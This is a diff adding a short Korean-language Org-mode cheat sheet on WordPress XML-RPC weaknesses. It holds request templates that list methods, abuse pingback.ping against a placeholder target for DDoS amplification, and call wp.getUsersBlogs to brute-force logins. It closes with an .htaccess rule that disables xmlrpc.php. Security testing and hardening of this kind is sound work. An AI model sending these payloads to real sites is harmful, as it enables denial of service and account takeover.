@@ -1,0 +1,74 @@
+* XML RPC 취약점 
+
+** 사용가능한 메서드 목록 보기
+#+BEGIN_SRC xml
+<methodCall>
+  <methodName>system.listMethods</methodName>
+  <params></params>
+</methodCall>
+#+END_SRC
+
+** say Hello!
+#+BEGIN_SRC xml
+<methodCall>
+  <methodName>demo.sayHello</methodName>
+  <params></params>
+</methodCall>
+#+END_SRC
+
+
+** DDOS testing payload using pingback.ping method
+#+BEGIN_SRC xml
+<methodCall>
+  <methodName>pingback.ping</methodName>
+  <params>
+    <param>
+      <value>
+<string>
+[target Site]
+</string>
+      </value>
+    </param>
+    <param>
+      <value> 
+<string>
+</string>
+      </value>
+    </param>
+  </params>
+</methodCall>
+#+END_SRC
+
+** Brute Force Testing
+#+BEGIN_SRC xml 
+<methodCall>
+  <methodName>wp.getUsersBlogs</methodName>
+  <params>
+    <param>
+      <value>
+<string>
+userid
+</string>
+      </value>
+    </param>
+    <param>
+      <value> 
+<string>
+passwd
+</string>
+      </value>
+    </param>
+  </params>
+</methodCall>
+#+END_SRC
+
+** XML-RPC 서비스 끄기
+.htaccess파일에 다음을 추가 
+#+BEGIN_SRC xml
+# BGIN Disable XML-RPC.PHP
+<Files xmlrpc.php>
+Order Deny, Allow
+Deny from all
+</Files>
+#END Disable XML-RPC.PHP
+#+END_SRC
